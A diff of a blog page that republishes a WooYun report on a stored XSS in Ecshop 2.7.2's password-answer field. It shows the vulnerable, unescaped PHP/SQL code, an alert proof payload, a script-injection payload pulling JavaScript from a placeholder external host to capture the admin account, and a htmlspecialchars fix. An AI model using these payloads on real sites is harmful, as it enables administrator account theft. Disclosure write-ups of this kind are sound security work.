@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        关于我 · \xeb\xfe&#39;s Blog
+        Ecshop2.7.2持久型XSS（可获得管理员帐号） · \xeb\xfe&#39;s Blog
         
     </title>
     <link rel="icon" href= /assests/favicon.ico>
@@ -109,11 +109,22 @@ white-space: pre;
     
 </head>
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >\xeb\xfe&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Ecshop2.7.2持久型XSS（可获得管理员帐号）</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>\xeb\xfe's Blog.</a>
 </header>
@@ -121,21 +132,43 @@ white-space: pre;
         <div class="site-intro">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
     <div class="site-intro-placeholder"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
+            Ecshop2.7.2持久型XSS（可获得管理员帐号）
+            <!-- 404 -->
+            
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = wooyun-1000php>wooyun-1000php</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2017/12/08</span>
+            </div>
         
     </div>
 </div>
@@ -205,11 +238,31 @@ white-space: pre;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="这里暂时什么都没有"><a href="#这里暂时什么都没有" class="headerlink" title="这里暂时什么都没有"></a>这里暂时什么都没有</h2>
+        <h3 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h3><p>个人资料修改时，Javascript代码过滤不够严格，XSS代码直接进入数据库</p>
+<h3 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h3><p><img src="/2017/12/08/wooyun-1000php-11/1.jpg" alt=""><br>存在漏洞的字段passwd_answer<br>漏洞文件(user.php)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 写入密码提示问题和答案 */</span></span><br><span class="line">   $sel_question = <span class="keyword">empty</span>($_POST[<span class="string">'sel_question'</span>]) ? <span class="string">''</span> : $_POST[<span class="string">'sel_question'</span>];</span><br><span class="line">   $passwd_answer = <span class="keyword">isset</span>($_POST[<span class="string">'passwd_answer'</span>]) ? trim($_POST[<span class="string">'passwd_answer'</span>]) : <span class="string">''</span>;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="keyword">empty</span>($passwd_answer) &amp;&amp; !<span class="keyword">empty</span>($sel_question))</span><br><span class="line">   &#123;</span><br><span class="line">       $sql = <span class="string">'UPDATE '</span> . $ecs-&gt;table(<span class="string">'users'</span>) . <span class="string">" SET `passwd_question`='$sel_question', `passwd_answer`='$passwd_answer'  WHERE `user_id`='"</span> . $_SESSION[<span class="string">'user_id'</span>] . <span class="string">"'"</span>;</span><br><span class="line">       $db-&gt;query($sql);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p>在提示答案处输入<code>&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>,点击保存后实现弹窗。<br><img src="/2017/12/08/wooyun-1000php-11/2.jpg" alt=""><br>我们可以通过填入一段引入外部js的代码来实现获取管理员账号:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/test.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>我下载的ecshop2.7.2版本好像有点变化，字段名变了，但是复现效果跟原文一样。</p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>对用户post过来的sel_question和passwd_answer字段，输入输出前通过htmlspecialchars过滤或者过滤掉特殊字符<br>example：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars($_POST[<span class="string">'passwd_answer'</span>])</span><br></pre></td></tr></table></figure></p>
+<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-0581.html" target="_blank" rel="noopener">Ecshop2.7.2持久型XSS（可获得管理员帐号）</a></p>
+
     </article>
     <!-- 前后页  -->
     <ul class="post-pager">
         
+            <li class="next">
+                <a href= "/2017/12/08/wooyun-1000php-12/" title= 游戏风云cms存在SQL注入 >
+                    <span>往前一页</span>
+                    <span>游戏风云cms存在SQL注入</span>
+                </a>
+            </li>
+        
+        
+            <li class="previous">
+                <a href= "/2017/12/08/wooyun-1000php-10/" title= HZCMS 合正网站群内容管理系统SQL注射漏洞 >
+                    <span>往后一页</span>
+                    <span>HZCMS 合正网站群内容管理系统SQL注射漏洞</span>
+                </a>
+            </li>
         
     </ul>
     <!-- 评论插件 -->
@@ -270,6 +323,13 @@ white-space: pre;
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简要描述"><span class="toc-number">1.</span> <span class="toc-text">简要描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#详细说明"><span class="toc-number">2.</span> <span class="toc-text">详细说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞证明"><span class="toc-number">3.</span> <span class="toc-text">漏洞证明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案"><span class="toc-number">4.</span> <span class="toc-text">修复方案</span></a></li></ol>
+    </div>
     
     <div class="back-top">&#xe639;</div>
     <div class="sidebar">
